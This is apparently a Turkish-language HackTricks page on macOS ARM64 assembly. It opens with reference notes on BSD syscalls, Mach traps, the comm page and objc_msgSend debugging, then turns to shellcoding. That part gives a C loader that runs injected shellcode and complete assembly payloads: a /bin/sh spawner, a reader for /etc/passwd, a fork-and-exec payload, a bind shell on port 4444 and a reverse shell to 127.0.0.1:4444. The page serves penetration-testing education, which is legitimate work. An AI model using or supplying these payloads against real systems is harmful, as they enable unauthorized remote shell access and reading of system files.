<figure><img src="../../../images/image (1200).png" alt=""><figcaption></figcaption></figure>

- **`AIF`**: Bazı istisnalar **`A`**, `I`, `F` bitleri kullanılarak devre dışı bırakılabilir. Eğer **`A`** 1 ise asynchronous aborts tetiklenecektir. **`I`** dış donanım Interrupt Requests (IRQ) yanıtını yapılandırır ve `F` Fast Interrupt Requests (FIQ) ile ilişkilidir.

## macOS

### BSD syscalls

Bakınız [**syscalls.master**](https://opensource.apple.com/source/xnu/xnu-1504.3.12/bsd/kern/syscalls.master) veya `cat /Library/Developer/CommandLineTools/SDKs/MacOSX.sdk/usr/include/sys/syscall.h` komutunu çalıştırın. BSD syscalls için **x16 > 0** olacaktır.

### Mach Traps

[**syscall_sw.c**](https://opensource.apple.com/source/xnu/xnu-3789.1.32/osfmk/kern/syscall_sw.c.auto.html) içindeki `mach_trap_table` ve [**mach_traps.h**](https://opensource.apple.com/source/xnu/xnu-3789.1.32/osfmk/mach/mach_traps.h) içindeki prototipleri inceleyin. Mach trap'lerinin maksimum sayısı `MACH_TRAP_TABLE_COUNT` = 128'dir. Mach traps için **x16 < 0** olur, bu yüzden önceki listeden çağırmanız gereken numaralara bir **eksi** koymanız gerekir: **`_kernelrpc_mach_vm_allocate_trap`** **`-10`**'dur.

Ayrıca bu (ve BSD) syscal'lerin nasıl çağrıldığını bulmak için bir disassembler'da **`libsystem_kernel.dylib`**'i inceleyebilirsiniz:
```bash
# macOS
dyldex -e libsystem_kernel.dylib /System/Volumes/Preboot/Cryptexes/OS/System/Library/dyld/dyld_shared_cache_arm64e

# iOS
dyldex -e libsystem_kernel.dylib /System/Library/Caches/com.apple.dyld/dyld_shared_cache_arm64
```
Note that **Ida** and **Ghidra** can also decompile **specific dylibs** from the cache just by passing the cache.

> [!TIP]
> Bazen **`libsystem_kernel.dylib`** içindeki **decompile edilmiş** kodu kontrol etmek **kaynak kodunu** kontrol etmekten daha kolay olabilir; çünkü birkaç syscall'ın (BSD ve Mach) kodu scriptler aracılığıyla üretilir (kaynak kodundaki yorumlara bakın), oysa dylib içinde hangi fonksiyonun çağrıldığı görülebilir.

### machdep calls

XNU, machine dependent olarak adlandırılan başka bir çağrı türünü destekler. Bu çağrıların numaraları mimariye bağlıdır ve ne çağrıların kendileri ne de numaraların sabit kalacağı garanti edilmez.

### comm page

Bu, kernel'e ait bir bellek sayfasıdır ve her kullanıcının sürecinin adres alanına eşlenir. Çok sık kullanılan kernel servisleri için syscall kullanmaktansa user modundan kernel alanına geçişi hızlandırmak için tasarlanmıştır; aksi takdirde bu geçiş çok verimsiz olurdu.

Örneğin `gettimeofdate` çağrısı `timeval` değerini doğrudan comm sayfasından okur.

### objc_msgSend

Objective-C veya Swift programlarında bu fonksiyonun kullanıldığını görmek çok yaygındır. Bu fonksiyon, bir Objective-C nesnesinin metodunu çağırmayı sağlar.

Parameters ([more info in the docs](https://developer.apple.com/documentation/objectivec/1456712-objc_msgsend)):

- x0: self -> İnstansa işaretçi
- x1: op -> Metodun selector'ü
- x2... -> Çağrılan metodun kalan argümanları

Bu nedenle, bu fonksiyona dallanmadan önce breakpoint koyarsanız, lldb'de ne çağrıldığını kolayca bulabilirsiniz (bu örnekte nesne, bir komut çalıştıracak `NSConcreteTask` nesnesini çağırıyor):
```bash
# Right in the line were objc_msgSend will be called
(lldb) po $x0
<NSConcreteTask: 0x1052308e0>

(lldb) x/s $x1
0x1736d3a6e: "launch"

(lldb) po [$x0 launchPath]
/bin/sh

(lldb) po [$x0 arguments]
<__NSArrayI 0x1736801e0>(
-c,
whoami
)
```
> [!TIP]
> env variable **`NSObjCMessageLoggingEnabled=1`**'i ayarlayarak bu fonksiyon çağrıldığında `/tmp/msgSends-pid` gibi bir dosyaya log tutabilirsiniz.
>
> Ayrıca **`OBJC_HELP=1`**'i ayarlayıp herhangi bir binary'yi çalıştırdığınızda, belirli Objc-C eylemleri gerçekleştiğinde loglamak için kullanabileceğiniz diğer environment variables'ları görebilirsiniz.

Bu fonksiyon çağrıldığında, belirtilen örneğin çağırılan metodunun bulunması gerekir; bunun için farklı aramalar yapılır:

- Perform optimistic cache lookup:
- If successful, done
- Acquire runtimeLock (read)
- If (realize && !cls->realized) realize class
- If (initialize && !cls->initialized) initialize class
- Try class own cache:
- If successful, done
- Try class method list:
- If found, fill cache and done
- Try superclass cache:
- If successful, done
- Try superclass method list:
- If found, fill cache and done
- If (resolver) try method resolver, and repeat from class lookup
- If still here (= all else has failed) try forwarder

### Shellcodes

Derlemek için:
```bash
as -o shell.o shell.s
ld -o shell shell.o -macosx_version_min 13.0 -lSystem -L /Library/Developer/CommandLineTools/SDKs/MacOSX.sdk/usr/lib

# You could also use this
ld -o shell shell.o -syslibroot $(xcrun -sdk macosx --show-sdk-path) -lSystem
```
Baytları çıkarmak için:
```bash
# Code from https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/b729f716aaf24cbc8109e0d94681ccb84c0b0c9e/helper/extract.sh
for c in $(objdump -d "s.o" | grep -E '[0-9a-f]+:' | cut -f 1 | cut -d : -f 2) ; do
echo -n '\\x'$c
done
```
Daha yeni macOS için:
```bash
# Code from https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/fc0742e9ebaf67c6a50f4c38d59459596e0a6c5d/helper/extract.sh
for s in $(objdump -d "s.o" | grep -E '[0-9a-f]+:' | cut -f 1 | cut -d : -f 2) ; do
echo -n $s | awk '{for (i = 7; i > 0; i -= 2) {printf "\\x" substr($0, i, 2)}}'
done
```
<details>

<summary>Shellcode'u test etmek için C kodu</summary>
```c
// code from https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/helper/loader.c
// gcc loader.c -o loader
#include <stdio.h>
#include <sys/mman.h>
#include <string.h>
#include <stdlib.h>

int (*sc)();

char shellcode[] = "<INSERT SHELLCODE HERE>";

int main(int argc, char **argv) {
printf("[>] Shellcode Length: %zd Bytes\n", strlen(shellcode));

void *ptr = mmap(0, 0x1000, PROT_WRITE | PROT_READ, MAP_ANON | MAP_PRIVATE | MAP_JIT, -1, 0);

if (ptr == MAP_FAILED) {
perror("mmap");
exit(-1);
}
printf("[+] SUCCESS: mmap\n");
printf("    |-> Return = %p\n", ptr);

void *dst = memcpy(ptr, shellcode, sizeof(shellcode));
printf("[+] SUCCESS: memcpy\n");
printf("    |-> Return = %p\n", dst);

int status = mprotect(ptr, 0x1000, PROT_EXEC | PROT_READ);

if (status == -1) {
perror("mprotect");
exit(-1);
}
printf("[+] SUCCESS: mprotect\n");
printf("    |-> Return = %d\n", status);

printf("[>] Trying to execute shellcode...\n");

sc = ptr;
sc();

return 0;
}
```
</details>

#### Shell

Buradan alındı [**here**](https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/shell.s) ve açıklandı.

{{#tabs}}
{{#tab name="with adr"}}
```armasm
.section __TEXT,__text ; This directive tells the assembler to place the following code in the __text section of the __TEXT segment.
.global _main         ; This makes the _main label globally visible, so that the linker can find it as the entry point of the program.
.align 2              ; This directive tells the assembler to align the start of the _main function to the next 4-byte boundary (2^2 = 4).

_main:
adr  x0, sh_path  ; This is the address of "/bin/sh".
mov  x1, xzr      ; Clear x1, because we need to pass NULL as the second argument to execve.
mov  x2, xzr      ; Clear x2, because we need to pass NULL as the third argument to execve.
mov  x16, #59     ; Move the execve syscall number (59) into x16.
svc  #0x1337      ; Make the syscall. The number 0x1337 doesn't actually matter, because the svc instruction always triggers a supervisor call, and the exact action is determined by the value in x16.

sh_path: .asciz "/bin/sh"
```
{{#endtab}}

{{#tab name="with stack"}}
```armasm
.section __TEXT,__text ; This directive tells the assembler to place the following code in the __text section of the __TEXT segment.
.global _main         ; This makes the _main label globally visible, so that the linker can find it as the entry point of the program.
.align 2              ; This directive tells the assembler to align the start of the _main function to the next 4-byte boundary (2^2 = 4).

_main:
; We are going to build the string "/bin/sh" and place it on the stack.

mov  x1, #0x622F  ; Move the lower half of "/bi" into x1. 0x62 = 'b', 0x2F = '/'.
movk x1, #0x6E69, lsl #16 ; Move the next half of "/bin" into x1, shifted left by 16. 0x6E = 'n', 0x69 = 'i'.
movk x1, #0x732F, lsl #32 ; Move the first half of "/sh" into x1, shifted left by 32. 0x73 = 's', 0x2F = '/'.
movk x1, #0x68, lsl #48   ; Move the last part of "/sh" into x1, shifted left by 48. 0x68 = 'h'.

str  x1, [sp, #-8] ; Store the value of x1 (the "/bin/sh" string) at the location `sp - 8`.

; Prepare arguments for the execve syscall.

mov  x1, #8       ; Set x1 to 8.
sub  x0, sp, x1   ; Subtract x1 (8) from the stack pointer (sp) and store the result in x0. This is the address of "/bin/sh" string on the stack.
mov  x1, xzr      ; Clear x1, because we need to pass NULL as the second argument to execve.
mov  x2, xzr      ; Clear x2, because we need to pass NULL as the third argument to execve.

; Make the syscall.

mov  x16, #59     ; Move the execve syscall number (59) into x16.
svc  #0x1337      ; Make the syscall. The number 0x1337 doesn't actually matter, because the svc instruction always triggers a supervisor call, and the exact action is determined by the value in x16.

```
{{#endtab}}

{{#tab name="with adr for linux"}}
```armasm
; From https://8ksec.io/arm64-reversing-and-exploitation-part-5-writing-shellcode-8ksec-blogs/
.section __TEXT,__text ; This directive tells the assembler to place the following code in the __text section of the __TEXT segment.
.global _main         ; This makes the _main label globally visible, so that the linker can find it as the entry point of the program.
.align 2              ; This directive tells the assembler to align the start of the _main function to the next 4-byte boundary (2^2 = 4).

_main:
adr  x0, sh_path  ; This is the address of "/bin/sh".
mov  x1, xzr      ; Clear x1, because we need to pass NULL as the second argument to execve.
mov  x2, xzr      ; Clear x2, because we need to pass NULL as the third argument to execve.
mov  x16, #59     ; Move the execve syscall number (59) into x16.
svc  #0x1337      ; Make the syscall. The number 0x1337 doesn't actually matter, because the svc instruction always triggers a supervisor call, and the exact action is determined by the value in x16.

sh_path: .asciz "/bin/sh"
```
{{#endtab}}
{{#endtabs}}

#### cat ile okuma

Amaç `execve("/bin/cat", ["/bin/cat", "/etc/passwd"], NULL)` komutunu çalıştırmaktır; bu yüzden ikinci argüman (x1) parametrelerin bir array'idir (bellekte bu, adreslerin bir stack'i anlamına gelir).
```armasm
.section __TEXT,__text     ; Begin a new section of type __TEXT and name __text
.global _main              ; Declare a global symbol _main
.align 2                   ; Align the beginning of the following code to a 4-byte boundary

_main:
; Prepare the arguments for the execve syscall
sub sp, sp, #48        ; Allocate space on the stack
mov x1, sp             ; x1 will hold the address of the argument array
adr x0, cat_path
str x0, [x1]           ; Store the address of "/bin/cat" as the first argument
adr x0, passwd_path    ; Get the address of "/etc/passwd"
str x0, [x1, #8]       ; Store the address of "/etc/passwd" as the second argument
str xzr, [x1, #16]     ; Store NULL as the third argument (end of arguments)

adr x0, cat_path
mov x2, xzr            ; Clear x2 to hold NULL (no environment variables)
mov x16, #59           ; Load the syscall number for execve (59) into x8
svc 0                  ; Make the syscall


cat_path: .asciz "/bin/cat"
.align 2
passwd_path: .asciz "/etc/passwd"
```
#### Komutu fork'tan sh ile çalıştırın, böylece ana süreç öldürülmez
```armasm
.section __TEXT,__text     ; Begin a new section of type __TEXT and name __text
.global _main              ; Declare a global symbol _main
.align 2                   ; Align the beginning of the following code to a 4-byte boundary

_main:
; Prepare the arguments for the fork syscall
mov x16, #2            ; Load the syscall number for fork (2) into x8
svc 0                  ; Make the syscall
cmp x1, #0             ; In macOS, if x1 == 0, it's parent process, https://opensource.apple.com/source/xnu/xnu-7195.81.3/libsyscall/custom/__fork.s.auto.html
beq _loop              ; If not child process, loop

; Prepare the arguments for the execve syscall

sub sp, sp, #64        ; Allocate space on the stack
mov x1, sp             ; x1 will hold the address of the argument array
adr x0, sh_path
str x0, [x1]           ; Store the address of "/bin/sh" as the first argument
adr x0, sh_c_option    ; Get the address of "-c"
str x0, [x1, #8]       ; Store the address of "-c" as the second argument
adr x0, touch_command  ; Get the address of "touch /tmp/lalala"
str x0, [x1, #16]      ; Store the address of "touch /tmp/lalala" as the third argument
str xzr, [x1, #24]     ; Store NULL as the fourth argument (end of arguments)

adr x0, sh_path
mov x2, xzr            ; Clear x2 to hold NULL (no environment variables)
mov x16, #59           ; Load the syscall number for execve (59) into x8
svc 0                  ; Make the syscall


_exit:
mov x16, #1            ; Load the syscall number for exit (1) into x8
mov x0, #0             ; Set exit status code to 0
svc 0                  ; Make the syscall

_loop: b _loop

sh_path: .asciz "/bin/sh"
.align 2
sh_c_option: .asciz "-c"
.align 2
touch_command: .asciz "touch /tmp/lalala"
```
#### Bind shell

Bind shell, [https://raw.githubusercontent.com/daem0nc0re/macOS_ARM64_Shellcode/master/bindshell.s](https://raw.githubusercontent.com/daem0nc0re/macOS_ARM64_Shellcode/master/bindshell.s) adresinden, **port 4444**'te
```armasm
.section __TEXT,__text
.global _main
.align 2
_main:
call_socket:
// s = socket(AF_INET = 2, SOCK_STREAM = 1, 0)
mov  x16, #97
lsr  x1, x16, #6
lsl  x0, x1, #1
mov  x2, xzr
svc  #0x1337

// save s
mvn  x3, x0

call_bind:
/*
* bind(s, &sockaddr, 0x10)
*
* struct sockaddr_in {
*     __uint8_t       sin_len;     // sizeof(struct sockaddr_in) = 0x10
*     sa_family_t     sin_family;  // AF_INET = 2
*     in_port_t       sin_port;    // 4444 = 0x115C
*     struct  in_addr sin_addr;    // 0.0.0.0 (4 bytes)
*     char            sin_zero[8]; // Don't care
* };
*/
mov  x1, #0x0210
movk x1, #0x5C11, lsl #16
str  x1, [sp, #-8]
mov  x2, #8
sub  x1, sp, x2
mov  x2, #16
mov  x16, #104
svc  #0x1337

call_listen:
// listen(s, 2)
mvn  x0, x3
lsr  x1, x2, #3
mov  x16, #106
svc  #0x1337

call_accept:
// c = accept(s, 0, 0)
mvn  x0, x3
mov  x1, xzr
mov  x2, xzr
mov  x16, #30
svc  #0x1337

mvn  x3, x0
lsr  x2, x16, #4
lsl  x2, x2, #2

call_dup:
// dup(c, 2) -> dup(c, 1) -> dup(c, 0)
mvn  x0, x3
lsr  x2, x2, #1
mov  x1, x2
mov  x16, #90
svc  #0x1337
mov  x10, xzr
cmp  x10, x2
bne  call_dup

call_execve:
// execve("/bin/sh", 0, 0)
mov  x1, #0x622F
movk x1, #0x6E69, lsl #16
movk x1, #0x732F, lsl #32
movk x1, #0x68, lsl #48
str  x1, [sp, #-8]
mov	 x1, #8
sub  x0, sp, x1
mov  x1, xzr
mov  x2, xzr
mov  x16, #59
svc  #0x1337
```
#### Reverse shell

Kaynak: [https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/reverseshell.s](https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/reverseshell.s), revshell için **127.0.0.1:4444**
```armasm
.section __TEXT,__text
.global _main
.align 2
_main:
call_socket:
// s = socket(AF_INET = 2, SOCK_STREAM = 1, 0)
mov  x16, #97
lsr  x1, x16, #6
lsl  x0, x1, #1
mov  x2, xzr
svc  #0x1337

// save s
mvn  x3, x0

call_connect:
/*
* connect(s, &sockaddr, 0x10)
*
* struct sockaddr_in {
*     __uint8_t       sin_len;     // sizeof(struct sockaddr_in) = 0x10
*     sa_family_t     sin_family;  // AF_INET = 2
*     in_port_t       sin_port;    // 4444 = 0x115C
*     struct  in_addr sin_addr;    // 127.0.0.1 (4 bytes)
*     char            sin_zero[8]; // Don't care
* };
*/
mov  x1, #0x0210
movk x1, #0x5C11, lsl #16
movk x1, #0x007F, lsl #32
movk x1, #0x0100, lsl #48
str  x1, [sp, #-8]
mov  x2, #8
sub  x1, sp, x2
mov  x2, #16
mov  x16, #98
svc  #0x1337

lsr  x2, x2, #2

call_dup:
// dup(s, 2) -> dup(s, 1) -> dup(s, 0)
mvn  x0, x3
lsr  x2, x2, #1
mov  x1, x2
mov  x16, #90
svc  #0x1337
mov  x10, xzr
cmp  x10, x2
bne  call_dup

call_execve:
// execve("/bin/sh", 0, 0)
mov  x1, #0x622F
movk x1, #0x6E69, lsl #16
movk x1, #0x732F, lsl #32
movk x1, #0x68, lsl #48
str  x1, [sp, #-8]
mov	 x1, #8
sub  x0, sp, x1
mov  x1, xzr
mov  x2, xzr
mov  x16, #59
svc  #0x1337
```
{{#include ../../../banners/hacktricks-training.md}}
